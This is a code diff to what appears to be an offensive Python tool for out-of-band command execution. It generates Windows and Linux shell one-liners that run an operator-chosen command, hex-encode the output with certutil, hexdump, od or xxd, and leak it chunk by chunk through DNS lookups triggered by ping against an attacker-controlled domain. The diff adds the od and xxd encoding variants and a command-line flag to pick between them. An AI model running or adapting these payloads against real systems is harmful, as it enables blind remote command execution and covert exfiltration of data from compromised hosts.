@@ -99,9 +99,14 @@ def get_config():
     getResult = False
 
 
-def generate_command():
+def generate_command(tool="hexdump"):
     commandTemWin = r'del execfile7 && del execfile7.txt && command > execfile7 &&echo 11111111111>>execfile7 && certutil -encodehex execfile7 execfile7.txt && for /f "tokens=1-17" %a in (execfile7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.execfile.{0}'
-    commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|hexdump -C > execfile7.txt && cat execfile7.txt |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
+    if tool == "od":
+        commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|od -t x1 | sed "s/[[:space:]]//g" | cut -c 4-60| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
+    elif tool == "xxd":
+        commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|xxd > execfile7.txt && echo "00000051" >> execfile7.txt && cat execfile7.txt | cut -c 5-49 | sed "s/[[:space:]]//g" | sed "s/://g" | cut -d "|" -f1| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
+    else:
+        commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|hexdump -C > execfile7.txt && cat execfile7.txt |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
     commandWin = commandTemWin.format(dnsurl)
     commandLinux = commandTemLinux.format(dnsurl)
     execfilename = ''.join(re.findall(r'[A-Za-z]', command)) 
@@ -274,8 +279,15 @@ if __name__ == "__main__":
     parser.add_argument('-m', "--model", help = "recent result", default = "result")
     parser.add_argument('-u', "--httpbasicuser", help="HTTPBasicAuth User")
     parser.add_argument('-p', "--httpbasicpass", help="HTTPBasicAuth Pass")
+    parser.add_argument('-l', "--linuxhex", help="Linux HEX tool")
     parser.add_argument("--force", action="store_true" , help = "force deal_ds_data")
     args = parser.parse_args()
+    if args.linuxhex == "od":
+        tool="od"
+    elif args.linuxhex == "xxd":
+        tool="xxd"
+    else:
+        tool="hexdump"
     if args.domain_server == None:
         if args.model == "GR":
             if args.dnsurl == None:
@@ -310,7 +322,7 @@ if __name__ == "__main__":
             print(token)
             command = input("请输入想要执行的命令:")
             get_new_config()
-            generate_command()
+            generate_command(tool)
     else:
         if args.model == "GR":
             if args.token == None:
@@ -345,7 +357,7 @@ if __name__ == "__main__":
             dataList = []
             skipLinesRe = 0
             get_ds_config()
-            generate_command()
+            generate_command(tool)
 
     while True:
         if finishOnce:
@@ -357,13 +369,13 @@ if __name__ == "__main__":
                 token = args.token
                 print(token)
                 command = input("请输入想要执行的命令:")
-                generate_command()
+                generate_command(tool)
             else:
                 dataList = []
                 skipLinesRe = 0
                 command = input("请输入想要执行的命令：")
                 get_ds_config()
-                generate_command()
+                generate_command(tool)
 
         if not args.domain_server == None:
             if getResult and getGR:
